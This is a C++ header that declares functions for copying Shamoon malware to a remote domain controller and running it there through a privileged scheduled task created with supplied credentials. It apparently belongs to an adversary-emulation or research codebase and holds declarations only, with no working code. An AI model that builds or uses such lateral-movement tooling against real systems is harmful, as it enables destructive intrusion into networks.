#ifndef HELPERS_H
#define HELPERS_H

#include <string>

/*
 * Returns the user associated with the current context.
 */
std::string GetCurrentUser();

/*
 * Checks if our current process is elevated. Returns false if not.
 * Sources:
 *  - https://stackoverflow.com/a/8196291
 */
bool CurrentProcessIsElevated();

/*
 * Copies malware to remote machine. Returns false if copying fails.
 */
bool CopyShamoonToDC(const char* kTargetMachine);

/*
 * Creates the scheduled task in a separate process.
 * Returns false if task creation failed.
 */
bool CreateScheduledTask(const char* kUsername, const char* kPassword,
                         const char* kDomainName, const char* kTargetMachine);

/*
 * Runs the event associated with the scheduled task in a separate process.
 * Returns false if process creation fails.
 */
bool RunScheduledTaskEvent(const char* kUsername, const char* kPassword,
                           const char* kDomainName, const char* kTargetMachine);

/*
 * Creates and executes a privileged scheduled task.
 * Returns false if task registration or event execution fails.
 * Sources:
 *  - https://serverfault.com/a/769309
 */
bool CreateAndRunScheduledTask(const char* kUsername, const char* kPassword,
                               const char* kDomainName, const char* kTargetMachine);

/*
 * Copies malware to remote machine. Creates and runs scheduled task.
 * Returns 0 if successful, -1 otherwise.
 */
int ExecuteShamoonOnRemoteMachine(const char * kUsername, const char * kPassword,
                                  const char * kDomain, const char * kTargetMachine);

#endif
